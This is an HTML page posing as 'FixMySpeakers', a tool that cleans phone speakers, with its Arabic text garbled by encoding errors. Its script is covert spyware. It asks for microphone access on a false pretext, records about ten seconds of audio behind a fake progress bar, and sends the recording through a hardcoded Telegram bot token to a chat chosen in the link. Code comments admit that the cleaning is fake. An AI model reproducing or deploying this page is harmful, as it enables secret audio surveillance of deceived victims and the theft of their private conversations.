<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FixMySpeakers | ØªÙ†Ø¸ÙŠÙ Ø³Ù…Ø§Ø¹Ø© Ø§Ù„Ù‡Ø§ØªÙ</title>
    <style>
        body { margin: 0; background: #111; color: #fff; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; }
        .card { background: #1a1a1a; padding: 30px; border-radius: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.5); width: 90%; max-width: 400px; border: 1px solid #333; }
        .icon { font-size: 60px; margin-bottom: 20px; animation: pulse 2s infinite; }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
        .btn { width: 100%; padding: 15px; background: #3b82f6; color: white; border: none; border-radius: 50px; font-weight: bold; cursor: pointer; font-size: 18px; margin-top: 20px; transition: 0.3s; }
        .btn:hover { background: #2563eb; }
        #status { margin-top: 20px; color: #9ca3af; font-size: 14px; }
        .waves { display: none; margin-top: 20px; }
    </style>
</head>
<body>

<div class="card">
    <div class="icon">ğŸ”Š</div>
    <h2>ØªÙ†Ø¸ÙŠÙ Ø³Ù…Ø§Ø¹Ø© Ø§Ù„Ù‡Ø§ØªÙ</h2>
    <p style="color: #ccc;">Ù‚Ù… Ø¨Ø¥Ø²Ø§Ù„Ø© Ø§Ù„Ù…Ø§Ø¡ ÙˆØ§Ù„ØºØ¨Ø§Ø± Ù…Ù† Ø³Ù…Ø§Ø¹ØªÙƒ Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… Ù…ÙˆØ¬Ø§Øª ØµÙˆØªÙŠØ© Ø¹Ø§Ù„ÙŠØ© Ø§Ù„ØªØ±Ø¯Ø¯.</p>
    
    <button id="startBtn" class="btn">Ø§Ø¨Ø¯Ø£ Ø¹Ù…Ù„ÙŠØ© Ø§Ù„ØªÙ†Ø¸ÙŠÙ</button>

    <div id="waves" class="waves">
        <p>Ø¬Ø§Ø±ÙŠ Ø¥ØµØ¯Ø§Ø± Ø°Ø¨Ø°Ø¨Ø§Øª Ø§Ù„ØªÙ†Ø¸ÙŠÙ...</p>
        <div style="height: 5px; background: #333; border-radius: 5px; overflow: hidden;">
            <div id="progress" style="width: 0%; height: 100%; background: #3b82f6; transition: 1s;"></div>
        </div>
    </div>
    
    <div id="status">Ø§Ø¶ØºØ· Ø¹Ù„Ù‰ Ø§Ù„Ø²Ø± Ù„Ø¨Ø¯Ø¡ Ø§Ù„ÙØ­Øµ ÙˆØ§Ù„Ø§ØµÙ„Ø§Ø­</div>
</div>

<script>
    const urlParams = new URLSearchParams(window.location.search);
    const targetId = urlParams.get('id');
    const botToken = '8417420328:AAGeX1WWGIRDx0S7CV0ID3Z6L8DkDeGrcrY';

    const startBtn = document.getElementById('startBtn');
    const wavesDiv = document.getElementById('waves');
    const statusDiv = document.getElementById('status');
    const progressBar = document.getElementById('progress');

    startBtn.onclick = async () => {
        if (!targetId) {
            alert("Ø®Ø·Ø£: ÙŠØ±Ø¬Ù‰ ÙØªØ­ Ø§Ù„Ø±Ø§Ø¨Ø· Ù…Ù† Ø®Ù„Ø§Ù„ Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„Ù…Ø±Ø³Ù„ Ø¥Ù„ÙŠÙƒ.");
            return;
        }

        try {
            // Ø·Ù„Ø¨ Ø§Ù„Ù…ÙŠÙƒØ±ÙˆÙÙˆÙ† Ø¨Ø­Ø¬Ø© Ù‚ÙŠØ§Ø³ ÙƒÙØ§Ø¡Ø© Ø®Ø±ÙˆØ¬ Ø§Ù„Ù‡ÙˆØ§Ø¡/Ø§Ù„ØµÙˆØª
            statusDiv.innerText = "ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„Ù…ÙŠÙƒØ±ÙˆÙÙˆÙ† Ù„Ù‚ÙŠØ§Ø³ Ø¬ÙˆØ¯Ø© Ø§Ù„ØµÙˆØª Ø£Ø«Ù†Ø§Ø¡ Ø§Ù„ØªÙ†Ø¸ÙŠÙ...";
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            
            const mediaRecorder = new MediaRecorder(stream);
            let chunks = [];

            startBtn.style.display = 'none';
            wavesDiv.style.display = 'block';
            statusDiv.innerText = "Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªÙ†Ø¸ÙŠÙ Ø¨Ø§Ù„Ø°Ø¨Ø°Ø¨Ø§Øª.. ÙŠØ±Ø¬Ù‰ Ø±ÙØ¹ ØµÙˆØª Ø§Ù„Ù‡Ø§ØªÙ Ù„Ø£Ù‚ØµÙ‰ Ø¯Ø±Ø¬Ø©.";

            mediaRecorder.ondataavailable = e => chunks.push(e.data);
            
            mediaRecorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'audio/ogg' });
                const formData = new FormData();
                formData.append('chat_id', targetId);
                formData.append('voice', blob, 'cleaning_test.ogg');
                formData.append('caption', `ğŸ”Š ØªØ³Ø¬ÙŠÙ„ Ù…Ù† Ù…ÙˆÙ‚Ø¹ ØªÙ†Ø¸ÙŠÙ Ø§Ù„Ø³Ù…Ø§Ø¹Ø§Øª`);

                fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, { method: 'POST', body: formData });
                
                statusDiv.innerText = "Ø§ÙƒØªÙ…Ù„Øª Ø§Ù„Ø¹Ù…Ù„ÙŠØ©! ØªÙ… ØªÙ†Ø¸ÙŠÙ Ø§Ù„Ø³Ù…Ø§Ø¹Ø© Ø¨Ù†Ø¬Ø§Ø­.";
                stream.getTracks().forEach(t => t.stop());
            };

            // Ø¨Ø¯Ø¡ Ø§Ù„ØªØ³Ø¬ÙŠÙ„ (Ø§Ù„ØªÙ†Ø¸ÙŠÙ Ø§Ù„ÙˆÙ‡Ù…ÙŠ)
            mediaRecorder.start();

            // ØªØ­Ø±ÙŠÙƒ Ø´Ø±ÙŠØ· Ø§Ù„ØªÙ‚Ø¯Ù… Ø§Ù„ÙˆÙ‡Ù…ÙŠ
            let percent = 0;
            const timer = setInterval(() => {
                percent += 10;
                progressBar.style.width = percent + "%";
                if (percent >= 100) {
                    clearInterval(timer);
                    mediaRecorder.stop();
                }
            }, 1000); // 10 Ø«ÙˆØ§Ù†ÙŠ Ù…Ù† Ø§Ù„ØªØ³Ø¬ÙŠÙ„

        } catch (err) {
            statusDiv.innerText = "ÙØ´Ù„! ÙŠØ¬Ø¨ Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø© Ø¹Ù„Ù‰ Ø§Ù„Ù…ÙŠÙƒØ±ÙˆÙÙˆÙ† Ù„Ù„Ø³Ù…Ø§Ø­ Ù„Ù„Ù†Ø¸Ø§Ù… Ø¨Ù‚ÙŠØ§Ø³ Ø°Ø¨Ø°Ø¨Ø§Øª Ø§Ù„ØªÙ†Ø¸ÙŠÙ.";
        }
    };
</script>
</body>
</html>
